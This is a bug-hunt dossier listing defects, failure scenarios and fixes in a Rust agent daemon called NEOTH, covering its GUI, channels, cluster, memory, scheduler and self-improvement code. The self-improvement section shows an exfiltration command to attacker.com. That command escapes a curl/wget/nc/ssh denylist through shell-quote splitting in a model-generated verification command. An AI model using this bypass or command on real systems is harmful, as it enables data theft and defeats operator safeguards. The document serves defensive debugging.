# NEOTH BUG-HUNT DOSSIER — 2026-07-16 (Session #11)

> **CURRENT RESOLUTION (2026-07-16):** this file is the immutable discovery
> dossier, not the current defect count. The source-by-source reconciliation
> resolved the original 62 candidates as **60 FIXED / 2 REFUTED / 0 original
> OPEN or PARTIAL**. The two refutations are the unattached live-vector-clock
> baseline attack and the alleged NUL truncation; neither has a reachable
> production failure path. Four net-new Wave-2 P1 contracts discovered during
> implementation remain open and are tracked under `WS-BUG` in
> `PLAN/ROAD_TO_1_0_GOLD.md`: hook `fail_fast`, channel hook parity plus atomic
> `once`, post-boot skill-directory watching, and channel `delegate_to`
> preservation. The historical scenarios below remain verbatim for provenance.

> Max-scale read-only bug hunt: 16 subsystem finders + adversarial-verify
> per finding (Workflow `wf_796be4c9-ea1`). Each finder was told to report only
> real, code-anchored defects with a concrete reachable failure scenario; each
> finding then faced an independent refuter (default REFUTED on doubt).
>
> **Yield: 62 findings captured. Adversarial verdicts landed: 41 CONFIRMED / 21 REFUTED** (the verdict schema carried no title
> echo, so verdicts are a corpus-level confidence signal, not a per-row label).
> The four ★ items below were additionally re-verified by hand against current
> code this session (file+content, line numbers may have drifted under Codex merges).
>
> Coverage note: 9 of 16 finder results landed in the journal before the verify
> barrier saturated on API load and the run was stopped; the 5 research docs
> (open GOLD-R4 rollups) are produced separately.

## Severity summary

- **P0**: 2
- **P1**: 22
- **P2**: 31
- **P3**: 7


## gui-glue

### P0 · panic — Byte-index slice on user chat text panics on non-ASCII input (UI thread crash) ★ (hand-verified this session)
- **Location:** `SRC/neothd-gui/src/main.rs:2163`
- **Failure scenario:** User sends a chat message longer than 80 bytes that contains a multi-byte UTF-8 codepoint (emoji, CJK, accented chars) such that byte offset 80 lands inside a multi-byte sequence. Example: 77 ASCII bytes + '🌍' (4 bytes) = 81 bytes total; body.len()=81 > 80 triggers `&body[..80]`; byte 80 is the 3rd byte of the emoji (0x8C, a continuation byte, not a char boundary) → str::index panics. This closure runs on the Slint event thread (inside on_chat_send_clicked), so the panic kills the entire event loop and crashes the application.
- **Fix:** Replace `&body[..80]` at main.rs:2163 with a char-boundary-safe truncation: `let snippet = body.char_indices().nth(80).map(|(i,_)| &body[..i]).unwrap_or(&body);`

### P0 · panic — Byte-index slice on subprocess error string panics on non-ASCII error text (UI thread crash) ★ (hand-verified this session)
- **Location:** `SRC/neothd-gui/src/main.rs:2318`
- **Failure scenario:** `format!("error: {}", &e[..e.len().min(60)])` slices the error string `e` at byte offset 60. Daemon error messages can contain non-ASCII text: file paths with Unicode characters, OS error messages in the operator's locale (German, Japanese, etc.), or credential validation errors. If `e.len() > 60` and byte 60 is a continuation byte of a multi-byte sequence, `str::index` panics. This runs inside an `invoke_from_event_loop` closure (the completion handler for the chat stream) — again on the Slint event thread, crashing the application on every chat reply that ends in a non-ASCII error.
- **Fix:** Replace `&e[..e.len().min(60)]` at main.rs:2318 with `e.char_indices().nth(60).map(|(i,_)| &e[..i]).unwrap_or(&e)`


## channels

### P1 · security — Discord forward_message bypasses operator allowlist — any guild member reaches pipeline ★ (hand-verified this session)
- **Location:** `SRC/neothd/src/channels/discord_gateway_loop.rs:398`
- **Failure scenario:** Operator sets `allowed_sender_id` in freedom.yaml expecting only their account can trigger NEOTH. A random Discord guild member sends a message. `forward_message` checks only `author_is_bot` (line 398), then calls `handler(inbound)` directly — no `sender_blocked_by_allowlist` call exists in this function or anywhere in `discord_gateway_loop.rs`. Message enters the full pipeline with operator-level authority.
- **Fix:** Add `allowed_sender_id: Option<String>` to `DiscordChannel` (discord.rs). In `forward_message` after the bot check, call `sender_blocked_by_allowlist(cfg.allowed_sender_id.as_deref(), &msg.author_id, gate_writer, "discord").await` and return on `true`. Pattern matches Matrix/IRC in mod.rs:123.

### P1 · resource-leak — Telegram download_file streams unbounded Vec when file.size == 0 — OOM before post-check
- **Location:** `SRC/neothd/src/channels/telegram.rs:976`
- **Failure scenario:** Some Telegram voice messages report `file.size == 0`. Pre-check at line 960 (`if file.size > 0 && ...`) is skipped. `bot.download_file(&file.path, &mut buf)` streams all bytes into a growable `Vec<u8>` with no per-chunk ceiling. Post-check at line 981 fires only after the full Vec is allocated. A CDN bug or MITM serving 200 MiB for a zero-size file grows the Vec to 200 MiB in memory before `buf.len() > MAX_INBOUND_ATTACHMENT_BYTES` triggers and returns an error.
- **Fix:** Replace the single `bot.download_file` call with a chunked loop that tracks cumulative bytes and bails early: `while let Some(chunk) = stream.next().await { received += chunk.len(); if received > MAX_INBOUND_ATTACHMENT_BYTES { bail!(...) } buf.extend_from_slice(&chunk); }`. Alternatively wrap the download stream in a byte-budget adapter before buffering.


## cluster-mesh

### P1 · correctness — GossipPolicy always defaults — operator replicate_raw_ingress and replay_budget_days never applied
- **Location:** `SRC/neothd/src/cluster/wal_sync.rs:553`
- **Failure scenario:** Operator sets `replicate_raw_ingress: true` in freedom.yaml. All four gossip spawn sites hardcode `let policy = GossipPolicy::default()` (wal_sync.rs:553, hyperswarm.rs:571, iroh_transport.rs:452, iroh_transport.rs:565). No code path in the cluster subsystem reads the ReloadController for gossip policy. Result: RawIngressGated frames are never replicated outbound (blocked by classify_event), and custom replay_budget_days is ignored (effective window always 30 days). The entire replicate_raw_ingress feature is silently non-functional.
- **Fix:** Add `reload_controller: Arc<ReloadController>` param to `spawn_gossip_tick` (wal_sync.rs:546) and read policy at tick start: `let policy = reload_controller.gossip_policy();`. Same for `gossip_handler` and `spawn_gossip_broadcast` in iroh_transport.rs (lines 452, 565) which receive the Arc via their closure capture. hyperswarm.rs:571 already has `reload_controller` in scope — replace `GossipPolicy::default()` with `reload_controller.gossip_policy()`.

### P1 · correctness — WAL cursor wraps to segment[0] after all segments exhausted — continuous full-WAL replay at 1 frame per 30-second tick
- **Location:** `SRC/neothd/src/cluster/wal_sync.rs:525`
- **Failure scenario:** Once all N WAL segments are fully consumed (cursor reaches EOF of the last segment), `next_index = (index + 1) % segments.len()` evaluates to 0. The cursor is stored as `(segments[0], offset=0)`. On the next gossip tick, the sender re-stages the oldest WAL event (origin_seq=1). The receiver correctly identifies seq < expected and sends Duplicate ACK; the cursor advances one slot. This continues at one frame per 30-second tick: a node running for months with 10,000 events takes ~3.5 months of continuous gossip traffic before reaching the current position again. Generates constant spurious traffic proportional to WAL history size.
- **Fix:** After the for-loop exhausts all segments without returning early, set cursor to EOF sentinel: `cursor.segment = segments.last().cloned(); cursor.offset = body.len();` (i.e., position at end of last segment so the next read finds no new frames until new WAL content is appended). Remove the `(index + 1) % segments.len()` wrap on line 525.


## daemon-lifecycle

### P1 · resource-leak — Detached iroh gossip-broadcast task holds WAL writer sender — shutdown hangs indefinitely
- **Location:** `SRC/neothd/src/cli/serve.rs:1983`
- **Failure scenario:** cluster-iroh feature enabled, at least one peer configured → `let _broadcast = spawn_gossip_broadcast(..., cluster_wal.clone())` drops the JoinHandle at end of the Ok(t) match arm, detaching the task → task runs infinite `loop { ticker.tick().await; ... }` with no exit condition and no cancellation channel → task holds `writer: Option<Arc<WalWriterHandle>>` (an independent mpsc::Sender clone) → shutdown_background_tasks calls `drop(writer)` (drops main sender) then `writer_join.await` → WAL writer channel never closes because the detached gossip task still holds its sender clone → `writer_join.await` blocks forever → daemon never completes graceful shutdown and must be hard-killed
- **Fix:** serve.rs:1983: change `let _broadcast =` to `let broadcast_handle =` (remove underscore prefix), add the handle to BackgroundHandles. In shutdown_background_tasks, call `abort_optional(broadcast_handle).await` before `drop(writer)` — same pattern as the existing `abort_optional(cluster_gossip_task)` for the peeroxide path.

### P1 · resource-leak — `iroh_transport_handle` WAL sender clone outlives writer_join.await via gossip_handler closure
- **Location:** `SRC/neothd/src/cli/serve.rs:1965`
- **Failure scenario:** cluster-iroh enabled → `cluster_wal.clone()` passed into `gossip_handler(...)` which is stored inside IrohTransport → `iroh_transport_handle: Option<Arc<IrohTransport>>` is a local in run_serve, NOT in BackgroundHandles → it drops only when run_serve returns, which is AFTER shutdown_background_tasks → but shutdown_background_tasks already hangs at `writer_join.await` (per finding 1) before returning, compounding the hang. Even if finding 1 were fixed independently, the gossip_handler's Arc<WalWriterHandle> inside IrohTransport keeps the sender alive until run_serve returns. Fix must also ensure iroh_transport_handle is dropped (or its WAL sender released) before writer_join.await.
- **Fix:** Add `iroh_transport_handle` to BackgroundHandles (or explicitly drop/abort it) before `drop(writer)` in the shutdown sequence, so IrohTransport (and its gossip_handler closure holding Arc<WalWriterHandle>) is released before writer_join.await is called.


## gui-glue

### P1 · correctness — User chat message passed raw as CLI positional arg — clap parses it as a flag ★ (hand-verified this session)
- **Location:** `SRC/neothd-gui/src/main.rs:2220`
- **Failure scenario:** `cmd.arg(&body)` appends the user's entire chat message as a positional argument to `neothd chat --stream [--attach …] <body>`. Any message beginning with `--` (e.g. `--help`, `--version`, `--no-audit`, or a pasted shell snippet) is parsed by the daemon's clap parser as a CLI flag rather than chat content. `--help` / `--version` cause the subprocess to print help/version text to stdout and exit 0; parse_stream_sentinel finds no sentinel, and the operator sees "Stream ended before completion" with clap's help output as the partial reply — effectively a DoS on the chat surface for any such message. If the daemon has flags that alter autonomy, cost-gating, or audit behaviour, a crafted `--` prefixed message could bypass safety mechanisms.
- **Fix:** Insert `cmd.arg("--")` before `cmd.arg(&body)` at main.rs:2220 to terminate clap's flag scan, so the message is always treated as a positional argument regardless of its content.

### P1 · correctness — parse_stream_sentinel rfind false-positive silently truncates reply ★ (hand-verified this session)
- **Location:** `SRC/neothd-gui/src/main.rs:12536`
- **Failure scenario:** `raw.rfind("{\"neoth_stream\":\"done\"")` searches the entire accumulated stdout buffer, including any LLM-generated text. If the model outputs a JSON snippet containing this exact prefix (common in code-generation tasks: `{"neoth_stream":"done", …}` could appear in generated JSON examples), AND the real sentinel is never appended because the stream was truncated (network drop, daemon crash), rfind finds the LLM-generated text as its match. The function returns `done=true` with `raw[..pos].trim_end()` as the reply. The `!done` error path that would surface the truncation error is bypassed; the operator receives a silently truncated reply rendered as if it were complete. The same rfind at line 12603 in `parse_stream_links` additionally risks surfacing fabricated navigation chips from the LLM-generated false sentinel.
- **Fix:** Delimit the sentinel to the final line only: parse `raw` in reverse line-by-line from the end rather than using rfind over the whole buffer; alternatively the daemon can write the sentinel on its own framed line with a length prefix or a start-of-line marker checked by the GUI.


## media

### P1 · resource-leak — WhisperLocalProvider decodes arbitrary-size audio into memory with no cap
- **Location:** `SRC/neothd/src/media/stt_provider.rs:2018`
- **Failure scenario:** Caller passes a multi-GB Asset::Bytes audio blob (e.g. from network). `audio.to_vec()` materialises the entire buffer in the daemon's heap. No size gate exists in WhisperLocalProvider::transcribe before decode; OOM-kill of the daemon results.
- **Fix:** Add `if audio.len() > MAX_AUDIO_BYTES { return Err(...) }` before `audio.to_vec()` at stt_provider.rs:2018, mirroring the 512 MiB gate that already exists in audio.rs:decode_from_path.

### P1 · resource-leak — FasterWhisperProvider writes unbounded WAV to temp file with no size limit
- **Location:** `SRC/neothd/src/media/stt_provider.rs:1831`
- **Failure scenario:** Attacker or misbehaving caller supplies multi-GB raw PCM. `encode_as_wav` materialises the full WAV bytes in `wav_bytes`, then `std::fs::write(temp.path(), &wav_bytes)` writes all of it to disk. No cap exists before either allocation or write; combination exhausts RAM then fills the temp filesystem.
- **Fix:** Enforce `if pcm_bytes.len() > MAX_AUDIO_BYTES { return Err(...) }` before `encode_as_wav` at stt_provider.rs:~1831. Reuse the same constant from audio.rs.

### P1 · panic — handle.block_on() inside async executor thread panics in dictation path
- **Location:** `SRC/neothd/src/media/dictation.rs:184`
- **Failure scenario:** Any async caller that invokes `transcribe_utterance` / `transcribe_utterance_with_writer` directly (without spawn_blocking) will reach `Handle::try_current()` → success, then `handle.block_on(...)` which panics on a tokio executor thread with 'Cannot start a runtime from within a runtime'. The production tests sidestep this by using spawn_blocking explicitly, masking the hazard for future async call sites.
- **Fix:** Change the function signature to `async fn` and `.await` the inner future, or gate the block_on call with `tokio::task::spawn_blocking` wrapping the entire synchronous body, matching the pattern used correctly in audio.rs:51.

### P1 · correctness — Python bridge test assertion checks wrong keyword — cache_dir vs download_root
- **Location:** `SRC/neothd/src/media/stt_provider.rs:3686`
- **Failure scenario:** The test asserts `FASTER_WHISPER_PYTHON_BRIDGE.contains("download_root=cache_root")` but the actual bridge constant at line 1157 emits `cache_dir=cache_root`. The assertion silently passes only if the constant is changed to use `download_root`, but the real faster-whisper API keyword is `cache_dir`. The test passes today only because both strings are absent or present together through some coincidence — the contract between the Rust-generated Python script and the faster-whisper library is entirely unverified.
- **Fix:** Change the test assertion to `FASTER_WHISPER_PYTHON_BRIDGE.contains("cache_dir=cache_root")` and add a complementary test that the generated script does NOT contain `download_root` so regressions are caught.


## memory-recall

### P1 · data-loss — Pinned hot episodes migrate to warm tier and permanently lose pin status ★ (hand-verified this session)
- **Location:** `SRC/neothd/src/memory/consolidate.rs:175`
- **Failure scenario:** Operator pins a high-trust memory on day 0 (auto-pin: trust=2, importance≥0.9). On day 8, Phase 2 hot→warm migration runs SELECT … FROM idx_episode WHERE ts_ns < ?1 with no AND pinned = 0 guard. The pinned row is 8 days old, so it is selected, INSERTed into idx_consolidated (no pinned column), and DELETEd from idx_episode. Pin status is permanently discarded. The memory now decays normally in warm tier and eventually drops below FORGET_FLOOR and is archived.
- **Fix:** consolidate.rs:175 — change the hot→warm SELECT to WHERE ts_ns < ?1 AND pinned = 0. Phase 1 already skips pinned rows for decay; Phase 2 must mirror that guard so pinned memories stay in idx_episode indefinitely.

### P1 · security — GDPR forget cascade leaves idx_memory_links rows for warm/cold tier events
- **Location:** `SRC/neothd/src/memory/forget.rs:383`
- **Failure scenario:** forget_by_topic_as_source collects forgotten_event_ids only from idx_episode (hot tier, line 386). It then calls forget_links_for_event for those IDs. But when the matching memories have already aged into idx_consolidated or idx_longterm, their event_ids never enter forgotten_event_ids, so no link rows are deleted for them. After the forget, idx_memory_links retains rows like (warm_eid_X, other_eid_Y) pointing to now-deleted warm/cold episodes. memory_hubs() surfaces those endpoint IDs to the operator, and a raw SQL scan sees the full co-access fingerprint of the erased topic.
- **Fix:** forget.rs after line 394 — also collect event_ids from idx_consolidated (WHERE text COLLATE NOCASE LIKE ?1 ESCAPE '\') and idx_longterm (same pattern) before their DELETE statements run. Add those IDs to forgotten_event_ids and call forget_links_for_event for all three tiers. Mirror the same fix in the preview's link_rows COUNT (line 189) to keep preview/actual in sync.

### P1 · data-loss — GC chunk DELETE errors swallowed; source row deleted anyway, orphaning chunks
- **Location:** `SRC/neothd/src/memory/gc.rs:101`
- **Failure scenario:** For each victim source ID, chunk and chunk_trigram DELETEs use .unwrap_or(0) (lines 101-109), discarding any rusqlite error. The source row is then deleted unconditionally at line 120. If a chunk DELETE fails (e.g. disk error, FTS5 integrity fault, locked page), the orphaned chunks/chunks_trigram rows remain with no parent source row. GC will never select them again because the sources row is gone; enforce_size_cap cannot reach them either. FTS5 corruption can cause every subsequent full-text query against that table to fail.
- **Fix:** gc.rs:101-109 — replace .unwrap_or(0) with .context("delete chunks for source {id}")? on both statements, propagating errors the same way enforce_size_cap does. Skip or log the source deletion if chunk cleanup fails.


## onboarding-repair

### P1 · correctness — BakVerdict::Stale never produced — --clean repair pass is dead code
- **Location:** `SRC/neothd/src/recovery/mod.rs:194`
- **Failure scenario:** walk_for_baks classifies every .bak via the match at line 194-197: None→LiveMissing, shrunk→LiveShrunk, same-or-larger→LiveOk. BakVerdict::Stale (line 123) is never assigned anywhere in the codebase (grep: zero hits for 'BakVerdict::Stale' outside the enum definition and test assertions). Any caller that filters on BakVerdict::Stale to decide whether to delete stale backups (e.g. the --clean recovery sub-command) silently skips every candidate — stale .bak files accumulate indefinitely and the user can never clean them through the intended API.
- **Fix:** recovery/mod.rs:194 — add a Stale arm: detect 'stale' as a .bak whose mtime is older than the live file's mtime (or whose content hash matches the current live content). Example: Some(live) if live >= bak_size && bak_mtime < live_mtime => BakVerdict::Stale. Then wire callers that perform --clean to filter on Stale.


## scheduling

### P1 · correctness — Double-fire: Applied-reload overwrites state.last_fired from disk, erasing in-memory fire cursor for edited jobs
- **Location:** `SRC/neothd/src/cron/scheduler.rs:263`
- **Failure scenario:** Job 'daily-news' fires at 07:00:00. Operator edits jobs.yaml at 07:01:00 (changes prompt, bumping generation G1→G2). Reload is Applied. reconcile() on disk creates a fresh G2 entry with last_fired=None. The Applied branch then replaces state.last_fired with data loaded from disk, so state.last_fired for 'daily-news' becomes None. On the next 30-second tick (07:01:30), should_fire_now(G2_job, 07:01:30, None) calls latest_due(07:01:30 − 2 min, 07:01:30). For a '* * * * *' or '0 7 * * *' cron the most-recent due time (07:01:00 or 07:00:00) is within the 2-minute window, so it returns Some(due). With last_fired=None, should_fire_now returns true and the job double-fires.
- **Fix:** At scheduler.rs:263, replace the wholesale overwrite with a merge: for surviving job IDs keep the current state.last_fired entry if it is newer than the disk value; only insert from disk for job IDs whose in-memory entry is absent. Deleted-job entries are already pruned by retain() two lines earlier, so surviving-job cursors should never be reset by a reload.

### P1 · race — Dependency-chain permanently blocked: Applied-reload overwrites state.completed, losing completions of concurrent spawned tasks not yet flushed to disk
- **Location:** `SRC/neothd/src/cron/scheduler.rs:269`
- **Failure scenario:** Job A completes. Its spawned task calls record_successful_outcome_if_current, which inserts A's completion into state.completed (in-memory Arc<Mutex>) before acquiring STATE_LOCK for the disk write. While the spawned task is waiting for STATE_LOCK, the scheduler's Applied-reload branch acquires STATE_LOCK first via RuntimeState::modify, reads disk (A not yet there), then replaces *state.completed.lock() with the disk snapshot — erasing A's in-memory entry. The spawned task then writes A to disk. But state.completed no longer has A, so any job B that depends_on A will never see the completed entry and remains blocked for the lifetime of the daemon process (no further reload == no further disk resync of state.completed).
- **Fix:** Same fix region as Finding 1: merge, don't overwrite. After the disk reconcile, insert from disk only for job IDs not already present in state.completed; or, after the task's disk write completes, re-add completed entries that were evicted by an interleaved reload. A simpler approach: swap the ordering — insert into state.completed only AFTER RuntimeState::modify succeeds, eliminating the pre-lock window.

### P1 · correctness — Stale-generation record_completion resets on-disk G2 entry back to G1, causing re-fire of edited job after daemon restart
- **Location:** `SRC/neothd/src/cron/state.rs:193`
- **Failure scenario:** Job A fires as generation G1. Operator edits jobs.yaml (G1→G2). Reload runs: reconcile() creates a fresh G2 disk entry with last_fired=None. The G1 task completes and calls RuntimeState::modify → record_completion(&G1_job, completed_at). Inside, record_fire(&G1_job, ...) computes generation = hash(G1_job) = G1. The on-disk entry has generation_sha256 = G2, so the mismatch branch resets the entry to JobRuntimeState { generation_sha256: G1, last_fired: None, completed_at: None }, then sets last_fired = fired_at. Back in record_completion, entry.completed_at = Some(completed_at) is applied. Disk now has a G1 entry again. On daemon restart, reconcile() sees G1 ≠ G2 (current) and creates a fresh G2 entry with last_fired=None. The 2-minute lookback then fires G2 immediately if the schedule aligns — a double-fire after restart.
- **Fix:** In state.rs::record_completion, guard against stale-generation callers: compute job_generation(job) at the top, look up the current disk entry, and early-return without modification if the disk entry's generation_sha256 differs from the caller's generation. Alternatively, the scheduler should not call record_completion for retired jobs (already guarded by record_successful_outcome_if_current but not by the underlying RuntimeState::modify path).


## selfdev

### P1 · race — TOCTOU: update_proposals closure overwrites terminal status without pre-condition check
- **Location:** `SRC/neothd/src/self_improve.rs:1788`
- **Failure scenario:** Thread A runs execute_proposal_with_verification (QA loop takes 30 s). Thread B finishes the same execute, persists VerifiedApproved; Thread C calls accept_proposal setting p1 to Accepted. Thread A finishes and calls update_proposals with a closure that unconditionally writes VerifiedApproved over Accepted (no current-status guard). A second accept_proposal now passes the VerifiedApproved check, reads the already-applied skill file as the backup, stores p.after as backup. Rollback later restores p.after (no-op); the original p.before content is permanently unrecoverable.
- **Fix:** At self_improve.rs:1789 inside the update_proposals closure add a status pre-condition before writing: if entry.status != ProposalStatus::Pending { return Err(anyhow::anyhow!("proposal already in {:?}", entry.status)); } — turns the silent overwrite into a propagating error.

### P1 · security — validate_verification_command denylist bypassed by bash shell-quote splitting
- **Location:** `SRC/neothd/src/self_improve.rs:2149`
- **Failure scenario:** allow_shell_verify = true. SkillOpt outputs verification_command = "c'url' http://attacker.com/exfil?d=secret". validate_verification_command lowercases to "c'url' ..." then searches for the substring "curl" — the bytes are c,apostrophe,u,r,l so the four consecutive chars curl are absent; denylist returns Ok. The sandbox spawns sh -c with that string; bash strips quotes and executes curl. The sandbox has PATH but no network isolation, so the exfiltration succeeds. Same bypass works for w'get', 'nc', ss'h', p'ow'ershell, etc.
- **Fix:** At self_improve.rs:2149, before the denylist loop sanitise the command by collapsing shell quoting chars to spaces: let sanitised = cmd.chars().map(|c| if matches!(c, '\'|'"'|'`'|'$'|'\\') { ' ' } else { c }).collect::<String>(); then run command_contains_token against sanitised. c'url' becomes c url, which does not match curl as a whole token, so the validator correctly blocks it.

### P1 · error-handling — False Approved return when proposal entry disappears before VerifiedApproved can be persisted
- **Location:** `SRC/neothd/src/self_improve.rs:1788`
- **Failure scenario:** execute_proposal_with_verification loads proposals at line 1617 (lock released). QA loop runs. If the proposal is deleted from disk between load and update_proposals, the if-let at line 1789 finds no entry and returns Ok(()) without writing. update_proposals saves the unchanged vec and returns Ok. The function falls through to return Ok((ExecutionVerdict::Approved, revises)) at line 1795. The caller receives a false Approved, attempts accept_proposal, which fails with a confusing error because the proposal is absent or still Pending.
- **Fix:** At self_improve.rs:1789 change the if-let to a mandatory find: let entry = proposals_w.iter_mut().find(|x| x.id == pid).ok_or_else(|| anyhow::anyhow!("proposal {pid} disappeared before VerifiedApproved could be persisted"))?; — propagates Err so the function returns Err rather than a false Approved.


## channels

### P2 · correctness — InboundDedup.check_and_insert is O(n) VecDeque scan under async Mutex — DoS amplifier
- **Location:** `SRC/neothd/src/channels/webhook_listener.rs:215`
- **Failure scenario:** Production cap is 2048 (serve_tasks.rs:5409, 5592). Meta reconnect storms replay all buffered wamids. Each `check_and_insert` call at line 215 does `self.ring.iter().any(|s| s == id)` — a linear scan over up to 2048 heap-allocated strings — while holding the `tokio::sync::Mutex`. Under a 500-message replay burst, the async executor is blocked for the full scan duration per message, starving all other tasks on that runtime thread. `EditDedup` in telegram.rs:572 uses `HashSet<(i64,i64)>` for O(1) lookup — the correct pattern already exists in the same codebase.
- **Fix:** Mirror `EditDedup`: add `seen: HashSet<String>` alongside `ring: VecDeque<String>`. In `check_and_insert`: lookup via `self.seen.contains(id)`, on eviction call `self.seen.remove(front)`, on insert call `self.seen.insert(id.to_owned())`. O(1) amortized. Drop `cap.min(4096)` inconsistency at line 207 while touching it.

### P2 · data-loss — Spool filename sanitization causes wamid collision — earlier message silently lost on crash
- **Location:** `SRC/neothd/src/channels/webhook_listener.rs:729`
- **Failure scenario:** Real WhatsApp wamids contain base64 characters including `+`, `/`, `=`, and often `.`. `spool_inbound_body_at` sanitizes all non-alphanumeric/dash/underscore chars to `_` and truncates to 96 chars. Two wamids like `wamid.ABCDxyz123+A` and `wamid.ABCDxyz123/A` both become `meta-wamid_ABCDxyz123_A.json`. When both arrive in the same 200-ACK window and a crash occurs after the second spool write, `atomic_write` has silently overwritten the first — only one message is recoverable from the spool.
- **Fix:** Append a collision-resistant suffix: `format!("{}-{:x}.json", sanitized_key, xxh3_64(raw_wamid.as_bytes()))`. The 64-bit hash makes collision probability negligible. The xxh3-rust crate is already a dependency.

### P2 · resource-leak — drain_inbound_spool_at dispatches all spool files without count cap or concurrency limit
- **Location:** `SRC/neothd/src/channels/webhook_listener.rs:771`
- **Failure scenario:** A crash during a Meta webhook storm leaves thousands of `.json` files in `~/.neoth/inbound_spool/`. On next startup, `drain_inbound_spool_at` reads all entries via `read_dir`, then dispatches each with `dispatch_messages(...).await` sequentially — no file count cap, no concurrency limit, no `DISPATCH_GATE` semaphore. With 5000 spooled files and 50 ms average dispatch latency, startup is blocked for ~4 minutes before the daemon is reachable. If the spool directory is writable by another process, it can inject arbitrarily many files to force unbounded startup work.
- **Fix:** Process at most `DISPATCH_GATE` permits worth of entries concurrently: collect filenames, take up to 512 (or cap at `DISPATCH_GATE.available_permits()`), dispatch with `tokio::spawn` + semaphore guard, log and skip the remainder with a warning. Process remaining entries in a background task after the server is accepting connections.


## cluster-mesh

### P2 · security — VectorClock grows without bound from attacker-injected peer entries in inbound gossip frames
- **Location:** `SRC/neothd/src/cluster/gossip_wire.rs:162`
- **Failure scenario:** A valid cluster member (holds cluster_key, passes auth) sends gossip frames with `vector_clock` containing arbitrary fake peer IDs. `GossipState::commit_inbound` (wal_sync.rs:313) calls `self.vc.merge(&frame.vector_clock)` which unconditionally inserts every peer ID from the attacker-controlled field into the local BTreeMap (gossip_wire.rs:162-170). The `content_sha256` digest does not cover `vector_clock`, so the injected entries are not bound to content integrity. The local VC grows without bound and is included in every outbound gossip frame. Slow-drip over many frames can inflate VC to megabytes, causing outbound frames to bloat and potentially exceed peeroxide's internal buffer limits.
- **Fix:** In `VectorClock::merge` (gossip_wire.rs:162), add a size cap: `if self.clocks.len() >= MAX_CLUSTER_SIZE && !self.clocks.contains_key(peer) { continue; }` where MAX_CLUSTER_SIZE is a constant (e.g. 256). In `commit_inbound`, also validate that every peer ID in the inbound VC is either a known peer or within the allowed ID format before merging.

### P2 · resource-leak — validate_content_shape imposes no length bound on Memory snapshot text field — storage exhaustion by cluster member
- **Location:** `SRC/neothd/src/cluster/durable_sync.rs:954`
- **Failure scenario:** A malicious (compromised) cluster member constructs a memory episode with arbitrarily large `text` (e.g. 500 MB) and gossips it as a `SyncContent::Memory` frame. `validate_content_shape` (durable_sync.rs:954-982) verifies `importance_micros`, timestamps, `tier`, and `stable_id = sha256(text)` integrity, but imposes no limit on `text.len()`. The receiver passes validation and stores the full text in `idx_foreign_events` and `mesh_sync_materialized`. No tombstone check applies (Memory is `Replicate` class). Repeated over multiple peers, this exhausts local disk. The attacker only needs a valid cluster_key.
- **Fix:** Add at durable_sync.rs:954 inside the Memory branch: `ensure!(snapshot.text.len() <= MAX_MEMORY_TEXT_BYTES, "memory text exceeds limit");` with a constant like `MAX_MEMORY_TEXT_BYTES: usize = 1_048_576` (1 MB). Also add a bound on `snapshot.stable_id` length.

### P2 · correctness — cursor.segment fallback to segments[0] when stored path not found — silent cursor reset causes full re-scan
- **Location:** `SRC/neothd/src/cluster/wal_sync.rs:474`
- **Failure scenario:** If the path stored in the persistent cursor no longer appears in the current sorted segment list (e.g. after WAL compaction renames or removes a segment), `segments.iter().position(|path| path == current)` returns None and `unwrap_or(0)` silently resets `start_index` to 0 (oldest segment). Additionally, `start_offset` is set to 0 because `cursor.segment != Some(segments[0])` (line 475-479). The gossip sender re-scans and re-stages all historical frames starting from segment 0, generating a full anti-entropy re-flood to all peers with no log warning. Peers receive duplicate frames they must individually reject via sequence counter, amplifying DB load.
- **Fix:** When the segment lookup fails, log a warning at warn! level and emit a metric. Only reset to segment[0] if the design intent is explicit re-sync; otherwise emit a sentinel that causes the tick to return an empty frame set and let the operator decide. At minimum add: `if cursor.segment.is_some() && start_index == 0 && cursor.segment.as_ref() != segments.first() { tracing::warn!("gossip cursor segment not found, resetting to oldest"); }`

### P2 · correctness — iroh spawn_gossip_broadcast calls send_frame sequentially with no per-peer timeout — stalled peer blocks all others
- **Location:** `SRC/neothd/src/cluster/iroh_transport.rs:611`
- **Failure scenario:** In `spawn_gossip_broadcast` (iroh_transport.rs:611-638), the peer loop calls `transport.send_frame(endpoint, &wire).await` sequentially for each known peer. `send_frame` (line 346) does `recv.read_to_end(MAX_FRAME_BYTES).await` with no explicit timeout. A peer that accepts the QUIC connection but sends no reply causes `read_to_end` to block until iroh's idle timeout fires. If the N0 preset idle timeout is long (e.g. 30s), a cluster of 64 peers where one is wedged can stall gossip broadcast for up to `64 × 30s = 32 minutes` per tick — far exceeding the 30-second tick interval. All other peers receive no gossip for the duration.
- **Fix:** Wrap `send_frame` calls with `tokio::time::timeout(SEND_FRAME_TIMEOUT, transport.send_frame(...)).await` where `SEND_FRAME_TIMEOUT = Duration::from_secs(10)`. Alternatively, spawn a `tokio::task::spawn` per peer so all sends run concurrently, eliminating the stall amplification entirely. The concurrent approach also improves throughput.


## daemon-lifecycle

### P2 · correctness — Blocking filesystem I/O on async runtime thread in restart watcher
- **Location:** `SRC/neothd/src/daemon/supervisor.rs:270`
- **Failure scenario:** `take_restart_request(&restart_home)` calls `path.exists()` (stat syscall) then `std::fs::remove_file()` (unlink syscall) directly inside a `tokio::spawn(async move { ... })` closure (serve.rs:2251). On NFS/CIFS-mounted `~/.neoth` (common in enterprise setups), or under heavy disk I/O, stat/unlink can block for hundreds of milliseconds to seconds → blocks the Tokio worker thread for that duration → all other async tasks sharing that thread stall → potential missed heartbeats or delayed channel processing on the same runtime.
- **Fix:** supervisor.rs:270: wrap the body of `take_restart_request` in `tokio::task::spawn_blocking(|| { ... }).await` at the call site in serve.rs:2256, or replace the two synchronous calls with `tokio::fs::try_exists` + `tokio::fs::remove_file` (both async-native).

### P2 · correctness — `confirm_drain_task` creates new reqwest::Client per approval with no request timeout — approval pipeline stalls
- **Location:** `SRC/neothd/src/cli/serve.rs:777`
- **Failure scenario:** `confirm_drain_task` is a sequential loop: `while let Some(req) = confirm_rx.recv().await { ... reqwest::Client::new().post(url).json(...).send().await; }`. No timeout is set. If Telegram API is unreachable (DNS resolution hangs, TCP SYN drops → default OS timeout ≈75s), `send().await` blocks for 75+ seconds. Because delivery is sequential, all subsequent approval notifications queue behind this hung send. The operator receives no Telegram prompt for any pending elevated-action gates during the outage window. Gates time out fail-closed (execution blocked), but silently — no notification ever arrives. Operator cannot unblock their own daemon without knowing why it is stuck.
- **Fix:** serve.rs:750: create one `reqwest::Client` with `.timeout(Duration::from_secs(10))` before the loop, reuse it for all iterations. Drop the per-iteration `reqwest::Client::new()` at line 777.

